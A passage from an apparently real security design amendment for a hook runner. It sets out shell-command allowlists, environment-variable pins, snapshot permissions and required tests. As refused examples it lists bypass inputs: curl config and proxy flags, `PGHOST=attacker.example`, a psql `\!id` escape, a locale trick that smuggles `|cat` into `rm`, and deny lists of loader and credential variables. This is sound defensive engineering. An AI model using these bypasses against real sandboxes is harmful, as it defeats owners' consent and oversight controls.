  class R file that is not a shell script (2.2 c) makes the hook `uncovered` (`not_shell_script`) and is still
  hashed and shown.
- **Class W (write).** The file need not exist. If it is a closure file: `writes_closure_file`. If it exists, it
  must be a regular file (a directory is `limit_exceeded`, a symlink `symlink`, link count above 1 `hardlink`).
  For the longest existing ancestor of the path, every component is `lstat`ed and no symlink may occur and the
  real path must stay inside the flows root (`symlink` or `outside_flows_root`), so a symlinked parent of a
  nonexistent leaf is refused. A file the hook creates is not in the snapshot at closure time, so a later class R
  operand that names it is `missing_file`: the closure cannot follow what a hook writes.
- **Class T (test).** Components are `lstat`ed and never followed: a symlink anywhere is `symlink` (so
  `[ -f ./link ]` is no existence oracle outside the root), link count above 1 is `hardlink`, a missing
  component means "absent" and passes, a directory or regular file passes, any other file type is
  `operand_shape`. An existing regular file is hashed.

| Position | Class |
|---|---|
| `cp` source | R |
| `cp` destination | W |
| `mv` source and destination | W (the source may not be a closure file; it is the hook's earlier output and need not exist at closure time; its absence at run time is the hook's own failure) |
| `rm`, `mkdir`, `touch` operand | W |
| `cat` operand | R |
| `<` source | R (except `/dev/null`) |
| `>` and `>>` target | W (except `/dev/null`) |
| the PATH of `-e -f -s -r -w -x` in `test` and `[` | T |

**Test grammar.** `test` and `[` (anything else is `flag_not_allowed`): at most one leading `!`, then exactly one
of `-e|-f|-s|-r|-w|-x PATH`, `-z STR`, `-n STR`, `STR = STR`, `STR != STR`, `INT -eq|-ne|-lt|-le|-gt|-ge INT`; for
`[` the last argument is `]`. **INT** is decimal: `^(0|[1-9][0-9]{0,8})$`, no sign. **STR** is a literal word that
does not start with `-` and is not `!`, `=`, `!=`, `(` or `)`, so `[ -f = -f ]` and `[ ! = ! ]` are refused.

**Snapshot permissions (completes 2.7).** Closure files are mode 0500 and every snapshot directory that directly
contains a closure file is mode 0500, so a hook cannot replace or delete one; a write there fails with a plain
error at run time. **Product limit, stated plainly: a hook whose scripts sit in the flows root cannot write to any
place reachable by a literal relative path next to them.** Owner decision (recommended default: provide the
scratch directory): the runner creates `<snapshot>/.hook-tmp/`, mode 0700, empty, per run; it never holds closure
files and is excluded from the closure. With it, **every class W path must normalise to `.hook-tmp/...`**, else
`outside_flows_root`, and a class R or T name under `.hook-tmp/` is never read from the flows root
(`missing_file` for R). The alternative is to provide no scratch directory, so hooks cannot write files at all.
At cleanup the runner removes the 0500 directories by `fchmod` to 0700 on each open directory descriptor before
`unlinkat` of its entries (2.7). **Immediately before each hook starts (so before `teardown`, after `setup` ran), every
closure file is re-opened (`O_NOFOLLOW`, `fstat`) and re-hashed from the snapshot and compared with its `files`
entry; a difference ends the hook `hooks_untrusted`, `hook_env_unsafe`, detail `snapshot_modified`.**

### 3. Flag allowlists for the file utilities

Options precede operands. Options are short flags only: an attached value, a long option, `--`-prefixed words
and a cluster containing a letter outside the table are `flag_not_allowed`. `--` is accepted once, directly
before the operands. The directory rule (2.4 item 7) stands: `-r`, `-R`, `-a`, `--recursive` are on no list.

| Utility | Flag letters | Operands |
|---|---|---|
| `cp` | `f`, `p` | exactly 2 |
| `mv` | `f` | exactly 2 |
| `rm` | `f` | exactly 1 (`rm -f ./x` yes, `rm -f a b` no) |
| `mkdir` | `p` | exactly 1 |
| `touch` | none | exactly 1 |
| `cat` | none | 1 or more |

`mkdir` creates the final directory, which must not exist at closure time (else `limit_exceeded`); `-p` only
permits missing **intermediate** directories, and existing intermediates must be real directories under the
root. No allowed utility creates a symlink. A script named as an operand of `cp`, `cat` or `mv` is hashed and
counted in the limits but **is not a callee**: it takes no part in depth or cycle counting (section 7).

### 4. `psql` (replaces 2.4 item 4)

Covered shape: `psql -X` followed by connection options in any order and exactly one `-c TEXT`; `-X` must be
the first argument. Everything else is `psql_input`: `-f`, `--file`, `-o`, `--output`, `-L`, `-v`, `--set`,
`--variable`, `-P`, `--pset`, `-s`, `-S`, `-1`, `-t`, `-A`, `-q`, `-l`, long forms (`--host=h`), attached values
(`-hhost`), a positional database or user, a stdin redirect, a pipe into `psql`, a second or missing `-c`, and
**any backslash in the raw source text of any argument** (`'\!'` and `\!` both count), so `\!`, `\copy`, `\i`
cannot be sent. (`-c` is `--command` in `psql` and `--cookie-jar` in `curl`; each table applies to its own
utility only.)

| Option | Value must match |
|---|---|
| `-h` | `^[A-Za-z0-9][A-Za-z0-9._:-]*$` (no leading `/` or `-`) |
| `-p` | `^[0-9]{1,5}$` |
| `-U` | `^[A-Za-z0-9_][A-Za-z0-9._-]{0,62}$` |
| `-d` | the `-U` pattern, or a URI `^postgres(ql)?://[A-Za-z0-9._:@-]*(/[A-Za-z0-9._-]*)?$` |
| `-w` | no value |
| `-c` | any literal word without a backslash |

A `-d` value with `=`, a space, `?`, `%` or `&` is a connection string or a URI with parameters and is
`psql_input`. The environment names that could add files or programs (`PSQLRC`, `PSQL_PAGER`, `PAGER`, `EDITOR`,
`SHELL`, `PGSYSCONFDIR` and the rest) are not reachable because `env` is an allowlist (section 9); `-X`
suppresses `~/.psqlrc` and `HOME` is an empty directory (2.9).

### 5. `curl` (replaces 2.4 items 5 and 6)

`curl` is covered only when it matches this section; **every flag not listed is `curl_input`**, including by
name `-K`, `--config`, `-T`, `--upload-file`, `-x`, `--proxy`, `--preproxy`, `--proxy-*`, `--socks*`,
`--resolve`, `--connect-to`, `--unix-socket`, `--abstract-unix-socket`, `--interface`, `--doh-url`, `-n`,
`--netrc*`, `-w`, `--write-out` (`%output{file}` writes, `@file` reads), `-F`, `--form`, `--data-urlencode`, `-u`,
`--user`, `-E`, `--cert`, `--key`, `--cacert`, `--capath`, `--crlfile`, `--pinnedpubkey`, `-b`, `--cookie`, `-O`,
`-J`, `-g`, `-:`, `--next`, `--url`, `-Z`, `--variable`, `-k`, `--`, `--name=value` forms, and any `--trace*`
other than the two below.

- **`-q`.** The first argument must be exactly the word `-q`. A `curl` whose first argument is anything else
  (`curl https://h/x`), or with `-q` later, inside a cluster (`-sq`) or spelled `--disable`: `curl_input`.
- **No value:** letters `s`, `S`, `f`, `L`, `i`, `I`, alone or clustered (only these letters), and `--silent`,
  `--show-error`, `--fail`, `--location`, `--include`, `--head`.
- **Integer value** (next word, `^[0-9]{1,4}$`): `-m`, `--max-time`, `--connect-timeout`, `--retry`.
- **Method:** `-X`, `--request` with `^[A-Z]{3,10}$`. **Header:** `-H`, `--header` with
  `^[A-Za-z][A-Za-z0-9-]*:[ -~]*$`. **Body:** `-d`, `--data`, `--data-raw`, `--data-binary`, `--json` with a
  literal word not starting with `@`.
- **Sinks:** `-o`, `--output`, `-D`, `--dump-header`, `-c`, `--cookie-jar`, `--stderr`, `--trace`,
  `--trace-ascii` only with the value `/dev/null` (this removes the earlier `/dev/stdout` and `/dev/stderr`).
- **URL operands** (at least one; every operand that is not a flag value). Check 1: prefix
  `^https?://(host)(:port)?` with host `[A-Za-z0-9][A-Za-z0-9.-]*` or `\[[0-9A-Fa-f:]{2,39}\]` containing at least
  two `:`, and port `[1-9][0-9]{0,4}` not above 65535; no match (also userinfo, scheme-less, `ftp://`) is
  `url_scheme`. Check 2, only after check 1 passed: the rest must be empty or start with `/`, `?` or `#`, with no
  whitespace or control character; a `{`, `}`, `[` or `]` there is `url_glob`. So `ftp://h/{a}` is `url_scheme`.

Names matching `*_PROXY` are not passable in any letter case (section 9), which closes lowercase `http_proxy`.
`-L` can follow a redirect to any http(s) host and the URL can name any host: residual (section 4 of the
amendment of 2026-11-01).

### 6. Operands of `exit`, `wait`, `printf`, `echo`, `sleep` (completes 2.2 a)

All failures are `operand_shape` unless stated.
- `exit`: no operand, or one matching `^(0|[1-9][0-9]{0,2})$` with value at most 255 (256 is refused, not wrapped).
- `wait`: no operand. `sleep` is in 2.2 b: exactly one operand `^[0-9]{1,3}$`, no suffix, no `infinity`.
- `echo`: operands are literals with no backslash in their raw source text, and the first does not start with
  `-`.
- `printf`: the first operand is a format made only of characters other than `%` and `\`, `%%`, `%s`, `%d` and the
  escapes `\n`, `\t`, `\\`; the number of further operands equals the number of `%s`/`%d`; each operand of a
  `%d` matches the INT pattern of section 2. Anything else, including `-v` or a leading `-`: `printf_format`.

*Pass:* `printf '%s\n' ready`, `exit 3`, `echo ok`. *Fail:* `printf '%b' x`, `printf '%d' 1x`, `exit $?`, `exit 256`,
`wait 123`, `echo -n x`, `echo 'a\nb'`, `sleep 1m`, `sleep infinity`.

### 7. Depth, cycles and counting (replaces the counting rule of 2.6)

- `setup` (or `teardown`) text is **depth 0**. A closure file named as a command word with `/` (2.2 c) by a
  depth-*d* text or file is at depth *d* + 1. **Depth 5 is allowed, 6 is `limit_exceeded`.** Operands of `cp`,
  `cat` and `mv` are not callees.
- **Identity** is (device, inode) of the opened descriptor, not the spelling.
- **Longest-path propagation, stated as an algorithm.** The call graph is enumerated **per call chain**, with no
  "already visited" skip: a file reached again through another chain is expanded again, and its depth is the
  maximum over all chains. A memoised search that skips the second chain is wrong. A cycle is a callee already on
  the current chain (including itself): `cycle`. To keep the enumeration bounded, more than 10 000 chain steps
  is `limit_exceeded`. **Precedence: `cycle` over `limit_exceeded`.**
- A file named twice is judged once, hashed once, counted once in the limits (50 distinct files, 1 MiB in total,
  256 KiB each, data files included), per consent entry (`setup` and `teardown` share them).
- *Tests:* (1) a chain of five scripts passes; (2) six fails; (3) `a.sh` calling `b.sh` twice passes with two
  entries in `files`; (4) `a.sh` calling `b.sh` and `c.sh`, both calling `d.sh`, lists `d.sh` once; (5)
  `a.sh` → `b.sh` → `a.sh` is `cycle`; (6) `a.sh` calling itself is `cycle`; (7) a hard-linked script is
  `hardlink`; (8) `root` calling `a` and `x1`, where `a` → `b` → `c` → `d` → `e` is depth 5 on chain one and
  `x1` → `x2` → `x3` → `x4` → `a` puts `e` at depth 9 on chain two: `limit_exceeded`; (9) the same graph plus
  `e` calling `a` is `cycle` (found on the first chain, and precedence picks it over the depth failure).

### 8. Interpreters and `/bin/dash` (refines 2.2 c)

A script whose first line is `#!/bin/dash` is accepted only if `stat("/bin/dash")` (following symlinks) is a
regular, executable file. The check runs when the closure is computed and again immediately before each hook
starts. If the interpreter disappears between that check and the exec, the exec fails with a plain error and
nothing runs unverified, because the script bytes were already verified. Otherwise the script is `uncovered`
(`interpreter_missing`). A script with `#!/bin/sh` or no `#!` line is unaffected. The interpreter's bytes are not
bound by the digest (same-user residual, section 13). **Owner decision:** keep `#!/bin/dash` with this check
(recommended default); the alternative accepts only `#!/bin/sh` and no `#!` line.

### 9. Env: an allowlist, case folding, the `.pgpass` entry (replaces the refusal list of 2.9)

**The `env` field of a consent entry is an allowlist.** Only these names may be listed: `PGPASSWORD`,
`PGCONNECT_TIMEOUT`, `PGAPPNAME`, `PGCLIENTENCODING`, and the seven pinned names of section 10. **Every other
name is `env_name_refused`**, at `trust hook` and again at every run against the signed entry. Names are matched
exactly after folding to upper case (ASCII only); a name outside `[A-Za-z_][A-Za-z0-9_]*` is refused. The deny
patterns of 2.9 are kept as documentation of why, extended by: `OPENSSL_*`, `SSLKEYLOGFILE`, `HOSTALIASES`,
`LOCALDOMAIN`, `RES_OPTIONS`, `KRB5*`, `GSS*`, `SASL_PATH`, `LDAPCONF`, `MALLOC_*`, `TZDIR`, `TERMINFO*`, `XDG_*`,
`NSS_*`, `LESSOPEN`, `pythonpath`-style lower-case copies and everything else that names a file, a library or a
program. A name outside the allowlist is refused even if no pattern lists it.

**Names the runner sets itself (2.9)** keep their value rules, tightened: `LANG` and `LC_*` pass only if the value
matches `^[A-Za-z]{2,3}(_[A-Za-z]{2})?(\.[A-Za-z0-9-]{1,16})?(@[A-Za-z0-9]{1,16})?$` *(superseded by the owner's
locale decision of 2026-11-03, below)*. **`TZ` passes only if it
matches `^[A-Za-z0-9_+-]{1,32}$`: no `/`, no `:`, no `.`, so it cannot name a file** (`UTC`, `EST5EDT`).
**Owner decision:** that pattern (recommended default), or always set `TZ=UTC` and ignore the parent value.

**Locales (owner decision, 2026-11-03).** `LANG` and each `LC_*` pass only if the value matches
`^(C|POSIX|C\.UTF-8|(en_[A-Z]{2}|vi_VN)\.(UTF-8|utf8))$`: English and Vietnamese in UTF-8, or the C locale. Any
other value is dropped, so the shell falls back to the C locale. *Why:* the earlier pattern admitted `zh_TW.BIG5`,
`ja_JP.SJIS` and `zh_CN.GBK`, under which macOS `/bin/sh` (bash 3.2) merges an ASCII byte 0x40-0x7E into a
preceding non-ASCII character, so `rm -f ./.hook-tmp/Á|cat ./x` runs as one `rm`. The tokeniser also refuses the
non-letter bytes of that range directly after a non-ASCII character (section 1), as a second line of defence.
*Revisit when* a team needs another language; any added locale must use a UTF-8 charset.
*Tests:* `LANG=vi_VN.UTF-8`, `LANG=en_US.UTF-8` and `LC_ALL=C` pass; `LANG=ja_JP.SJIS`, `LANG=zh_TW.BIG5`,
`LANG=fr_FR.UTF-8`, `LANG=en_US` and `LANG=../x` are dropped.

**Case folding.** All patterns of 2.9 and ADR 0025 section 4 are matched on the upper-cased name; `*` matches any
run, including none. `pythonpath`, `Http_Proxy`, `ld_preload`, `curl_ca_bundle`, `NoDe_OpTiOnS` and a lower-case
copy of the System 1 key name are refused (and are not on the allowlist anyway).

**Digest shape.** `env` is the sorted (bytewise) list of names with duplicates refused at consent. `pins` keys
must be a subset of `env`, and every pinned-set name in `env` has a pin.

**The `.pgpass` field.** The entry and digest carry `"pgpass": null` or `"pgpass": "<normalised path>"`. It is set
only by `trust hook --pgpass PATH`, which adds the file to `files` itself (kind `data`, hashed, shown in full);
nothing else creates `<snapshot>/home/.pgpass`. Shape (else `pgpass_shape`, at consent and at run): at most
4 KiB, UTF-8, no CR, lines separated by LF with a final LF optional; a line is either empty (zero bytes), a
comment starting with `#`, or exactly five non-empty fields `host:port:database:user:password` separated by
unescaped `:` (`\:` and `\\` are the only escapes); a whitespace-only line is `pgpass_shape`; the host field is
not `*`. It is copied from the open descriptor, mode 0600.

**CLI spelling.** `trust hook <name> --env NAME` (a name without a value), `--pin NAME=VALUE` (a pinned-set name;
it also adds the name to `env`), `--pgpass PATH`. `--env` of a pinned-set name without `--pin` is
`env_value_unpinned`.

### 10. Env values (closes T0.28)

Consent covers names, not values. `PGHOST`, `PGUSER`, `PGDATABASE`, `PGSSLMODE`, `PGSERVICEFILE`, `PGPASSFILE`,
`PGSYSCONFDIR` and the rest of the `PG*` family can point a consented `psql` at another server or another
configuration file while the text, the digest and the names stay the same.

**10.1 Refused outright** (`env_name_refused`; they are off the allowlist of section 9, listed here by name):
`PGSERVICE`, `PGSERVICEFILE`, `PGPASSFILE`, `PGSYSCONFDIR`, `PGSSLROOTCERT`, `PGSSLCERT`, `PGSSLKEY`, `PGSSLCRL`,
`PGSSLCRLDIR`, `PGSSLKEYLOGFILE`, `PGLOCALEDIR`, `PGKRBSRVNAME`, `PGGSSLIB`, `PGGSSENCMODE`, `PGGSSDELEGATION`,
`PSQLRC`, `PSQL_HISTORY`, `PSQL_PAGER`, `PSQL_WATCH_PAGER`, `PSQL_EDITOR`, `PSQL_EDITOR_LINENUMBER_ARG`, `PAGER`,
`EDITOR`, `VISUAL`, `SHELL`, and every other `PG*` or `PSQL*` name not in 10.2 or the pass-through list (libpq
adds variables in each release).

**10.2 Pinned** (exactly): `PGHOST`, `PGHOSTADDR`, `PGPORT`, `PGUSER`, `PGDATABASE`, `PGSSLMODE`, `PGOPTIONS`.
The entry carries `"pins": {"NAME": "value", ...}` (keys sorted, in the digest), shown at consent. Value must
match, else `env_value_invalid`:

| Name | Value must match |
|---|---|
| `PGHOST` | `^[A-Za-z0-9][A-Za-z0-9._:,-]*$` (no socket directory) |
| `PGHOSTADDR` | IPv4 dotted quad, each octet 0 to 255 without leading zeros; or IPv6 `^[0-9A-Fa-f:]{2,39}$` with at least two `:`, no zone id (`%`), no comma |
| `PGPORT` | `^[0-9]{1,5}(,[0-9]{1,5})*$` |
| `PGUSER`, `PGDATABASE` | `^[A-Za-z0-9_][A-Za-z0-9._-]{0,62}$` |
| `PGSSLMODE` | one of `disable`, `allow`, `prefer`, `require`, `verify-ca`, `verify-full` |
| `PGOPTIONS` | printable ASCII (0x20 to 0x7e), at most 256 characters |

**10.3 Compared at run time.** The run reads the parent value and compares it byte for byte with the pin. Equal:
the child receives it. Different, unset or empty: the hook does not start, `hook_env_unsafe`, detail
`env_value_mismatch`; the hint names the variable and never prints the parent value.

**10.4 Unbound.** The values of `PGPASSWORD`, `PGCONNECT_TIMEOUT`, `PGAPPNAME`, `PGCLIENTENCODING`. A secret is
never pinned.

**Owner decision (recommended default: 10.1 to 10.3 as written).** Alternatives: (a) names only, the state before
this amendment; rejected because `PGHOST=attacker.example` redirects a consented hook with nothing changed that
the owner saw. (b) Pin every consented value; rejected because it puts secrets into the store. (c) Refuse every
`PG*` name and carry host, port, user and database as `psql -h -p -U -d` in the hashed hook text; viable and
simpler, but it needs one hook text per target and machine. The default keeps the hook text shared and puts the
per-machine value in the per-machine store entry, where the owner saw it.

### 11. Other owner decisions in this amendment

- The `curl` allowlist of section 5, in particular that `-k`, `-u` and `-w` are left out (recommended default).
- `cp`, `mv` exactly two operands, `rm` exactly one (section 3, recommended default).
- Class R files must be shell scripts, so `cp` and `cat` cannot read data files (2.4 item 3, kept as the
  recommended default; the alternative lets `cp` and `cat` read a hashed, shown data file).
- Sections 8 and 9: `#!/bin/dash` kept with a check; `TZ` pattern; locales limited to English and Vietnamese
  (decided by the owner on 2026-11-03).

**Implementation notes (T1.0, 2026-11-03; for the owner to confirm).** Where the first implementation differs
from the text above:
- The CLI flag for an env name is `--hook-env NAME`, not `--env NAME`: `--env` already selects the target env
  of `flowctl replay` and `login`. `--pin NAME=VALUE` is as written.
- The snapshot is removed by walking paths with `lstat` before each `chmod` and a non-following recursive
  remove, not with `fchmod`/`unlinkat` on descriptors (Node has no `unlinkat`). It is a same-uid race only.
- A `PATH` directory of the fixed list that does not exist passes the 2.9 checks; it adds nothing to the lookup.
- `--pgpass` is refused until the snapshot binds and copies the file.
- `trust init` registers one project per machine; a second needs `trust add project`, not built yet.

### 12. Tests the implementation must have

One test per line; "passes" means no `uncovered` entry from that command.

1. Section 1: every example above. A NUL; `echo a\<NUL><newline>#x; curl -K f https://h/x`; a CR (a CRLF script); a form
   feed: each is `syntax` and non-consentable. A script without a trailing newline passes. `true() ( echo F )`,
   `true &`, `echo a ;; echo b`, `echo a 10>f`, `echo a >#x`, `echo a > #x` are `syntax`; `echo a 2>&1`,
   `echo a 1>&2`, `echo a >&2` pass. `true # note \<newline>curl -q -K evil.cfg https://h/x` is `curl_input`, also
   when the text is a closure script. `echo ''#x; curl -K f https://h` is `curl_input`; `""#x`, `a''#x`, `a#x`,
   `\#x` are words, `#x` and `a #x` are comments. **Differential test:** for every cell of the table, run a
   probe through `/bin/sh` and through `/bin/dash` (when present) in a scratch directory holding files that a
   glob or tilde would match, and assert that where the table says "literal" neither shell expanded and where
   it says `expansion` the hook is refused.
2. Section 2: `cp ./a.sh ./.hook-tmp/b.sh` passes; `cp ./a.sh ./b.sh` is `outside_flows_root`; `cp ./a.sh ./A.SH` is
   `outside_flows_root` too, and a write to a closure file's other spelling at run time ends `snapshot_modified`; `cat /dev/null` and `rm /dev/null` and `touch ../x` are
   `outside_flows_root`; `true >/dev/null` and `true </dev/null` pass; `: > /dev/stdout` is
   `outside_flows_root`; `cat -` and `cat a -n` and `rm -- -x` are `flag_not_allowed`; a path word with a
   newline, of 4097 bytes, ending in `/`, or not NFC is `operand_shape`; `[ -f ./link ]` with a symlink is
   `symlink`; a symlinked parent of a new file is `symlink`; `[ -f ./absent ]` passes; `[ -f = -f ]` and
   `[ ! = ! ]` are `flag_not_allowed`; `setup` writes `./td.sh` and `teardown` runs it: `writes_closure_file`;
   with a test double that changes a snapshot closure file between `setup` and `teardown`, `teardown` does not
   start (`hook_env_unsafe`, `snapshot_modified`).
3. Section 3: `rm -r x`, `cp -R a b`, `mv -n a b`, `mkdir -m 700 d`, `touch -t 1 x` are `flag_not_allowed`;
   `rm -f a b`, `cp a b c` are `operand_shape`; `mkdir -p ./.hook-tmp/d/e` passes, `mkdir ./.hook-tmp` is `limit_exceeded`.
4. Section 4: `psql -X -h h -p 5432 -U u -d db -w -c 'select 1'` passes; each of `-o f`, `-v a=b`,
   `-P pager=x`, `--host=h`, `-hh`, `-d 'host=x passfile=/y'`, `-d 'postgres://h/db?sslrootcert=/f'`, a second
   `-c`, `-X` not first, `-c '\!id'` and `-c \!id` is `psql_input`.
5. Section 5: `curl -q -s -f https://h/x` passes; `curl https://h/x`, `curl -s -q https://h/x`, `curl -qs ...`,
   `-x`, `--resolve`, `--connect-to`, `-w`, `--netrc`, `-H @f`, `--data-binary @f`, `--max-time=5`,
   `-o /tmp/x`, `-o /dev/stdout` are `curl_input`; `-o /dev/null` passes; `'https://h/{a,b}'` is `url_glob`;
   `ftp://h/{a}` is `url_scheme`; `http://[::1]:3000/x` passes; `localhost:3000`, `http://h:0` and
   `http://-h/` are `url_scheme`.
6. Section 6: the examples there.
7. Section 7: the nine tests there, plus a graph of five layers of seven scripts, each calling all seven of the next
   layer (35 files, 16 807 chains): `limit_exceeded` from the 10 000 step cap. Snapshot test: closure files and the
   directories directly holding them are 0500, `.hook-tmp` is 0700 and empty at start, and cleanup removes the
   whole snapshot.
8. Section 8: with `stat` of `/bin/dash` faked as missing, a `#!/bin/dash` script is `interpreter_missing`.
9. Section 9: `AWS_SECRET_ACCESS_KEY`, `pythonpath`, `Http_Proxy` and `PYTHONPATH` in `env` are refused at
   `trust hook`; a signed entry edited by hand to hold one ends the run `env_name_refused`; `TZ=:/etc/passwd`
   and `TZ=../x` are dropped, `TZ=UTC` passes; `LANG=../x` is dropped; a `.pgpass` with four fields, an empty
   field, a `*` host, a CR or 5 KiB is `pgpass_shape`; one with a final line lacking LF passes;
   `--pgpass` adds the file to `files` as `data`; `pins` with a key not in `env` is refused.
10. Section 10: `PGSERVICEFILE`, `pgpassfile`, `PGSSLROOTCERT`, `PSQLRC`, `PAGER`, `PGFOO` are
    `env_name_refused`; `PGPASSWORD` and `PGCONNECT_TIMEOUT` are accepted without a value; `PGHOST` without
    `--pin` is `env_value_unpinned`; `PGHOST=/var/run/postgresql`, `PGSSLMODE=bogus`, `PGHOSTADDR=1.2.3.4,5.6.7.8`,
    `PGHOSTADDR=fe80::1%eth0` and a `PGOPTIONS` with a newline are `env_value_invalid`; with
    `PGHOST=db.local` pinned, a parent `PGHOST=db.local` is seen by the fixture stand-in, and a parent
    `PGHOST=other`, unset or empty ends `env_value_mismatch` before the hook starts; re-consenting with a
    different pin writes a different digest; a pin edited by hand in the stored entry fails the entry's owner-key
    signature (ADR 0025 section 3); the hint never contains the parent value.

### 13. Left undecidable, with the fail-closed answer, and residuals

- What the receiving program does with a literal `-c` text or header (server-side `COPY ... PROGRAM`, SQL
  functions that read server files): not judged; shown at consent; the digest binds the text only.
- Anything a hook writes and later reads: `missing_file` (section 2).
- Which shell runs a script: macOS `/bin/sh` is bash 3.2 and Debian's is dash. Section 1 and the allowlists keep to
  constructs both agree on and the differential test checks it; the rest is `uncovered`. The digest records the
  string `/bin/sh -c`, not a version or the interpreter's bytes.
- Values of `PGPASSWORD`, `PGCONNECT_TIMEOUT`, `PGAPPNAME`, `PGCLIENTENCODING`, the host a `curl` URL names, and
  redirect targets of `-L`: unbound.
- A same-uid process can still write into the 0700 snapshot or change `/bin/sh`, `/bin/dash` and the system
  utilities (section 4 of the amendment of 2026-11-01). Re-hashing before each hook narrows the window and does
  not close it.
- `curl` without `-m` and long `sleep` (up to 999 s) can hold a run: a denial of service, not a bypass.
